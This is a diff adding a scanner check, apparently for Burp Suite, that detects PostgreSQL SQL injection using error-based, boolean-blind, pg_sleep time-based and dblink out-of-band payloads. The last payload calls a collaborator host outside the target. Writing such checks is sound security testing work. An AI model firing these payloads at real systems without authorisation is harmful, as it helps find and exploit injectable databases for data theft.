@@ -1,0 +1,64 @@
+# PostgreSQL SQL Injection Detection
+# Tests error-based, boolean-based, time-based, and OOB SQLi
+
+given insertion_point: "request"
+
+# Extract baseline response
+extract original_body from response.body
+extract original_status from response.status
+extract original_time from response.time
+
+# 1. Error-Based: Trigger PostgreSQL syntax error
+send request:
+  replace insertion_point with insertion_point + "'"
+if regex `ERROR:.*syntax error|unterminated quoted string` in response.body then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "PostgreSQL SQL Injection (Error-Based)"
+    detail: "PostgreSQL error detected with payload: {insertion_point + '''}. Response: {regex `ERROR:.*syntax error|unterminated quoted string`}"
+    remediation: "Use parameterized queries or prepared statements."
+end if
+
+# 2. Boolean-Based Blind: Check response content change
+send request:
+  replace insertion_point with insertion_point + "' AND 1=1--"
+extract true_response from response.body
+
+send request:
+  replace insertion_point with insertion_point + "' AND 1=2--"
+extract false_response from response.body
+
+if true_response != false_response and true_response == original_body then
+  report issue:
+    severity: high
+    confidence: firm
+    name: "PostgreSQL SQL Injection (Boolean-Based Blind)"
+    detail: "Response changed between true (1=1) and false (1=2) conditions. True payload: {insertion_point + ''' AND 1=1--'}"
+    remediation: "Validate and sanitize inputs; use parameterized queries."
+end if
+
+# 3. Time-Based Blind: Use pg_sleep
+send request:
+  replace insertion_point with insertion_point + "' AND pg_sleep(5)--"
+  set timeout to 10 seconds
+if response.time > original_time + 5000 then
+  report issue:
+    severity: high
+    confidence: tentative
+    name: "PostgreSQL SQL Injection (Time-Based Blind)"
+    detail: "Response delayed by {response.time - original_time}ms with payload: {insertion_point + ''' AND pg_sleep(5)--'}"
+    remediation: "Use prepared statements to prevent injection."
+end if
+
+# 4. Out-of-Band: DNS via dblink
+send request:
+  replace insertion_point with insertion_point + "'; SELECT dblink_connect('host=test.' || collaborator_address || ' port=80 user=postgres dbname=postgres');--"
+if dns interactions then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "PostgreSQL SQL Injection (Out-of-Band)"
+    detail: "DNS interaction detected via Collaborator with payload: {insertion_point + '''; SELECT dblink_connect('host=test.' || collaborator_address || ' port=80 user=postgres dbname=postgres');--'}"
+    remediation: "Disable dblink extension and use parameterized queries."
+end if
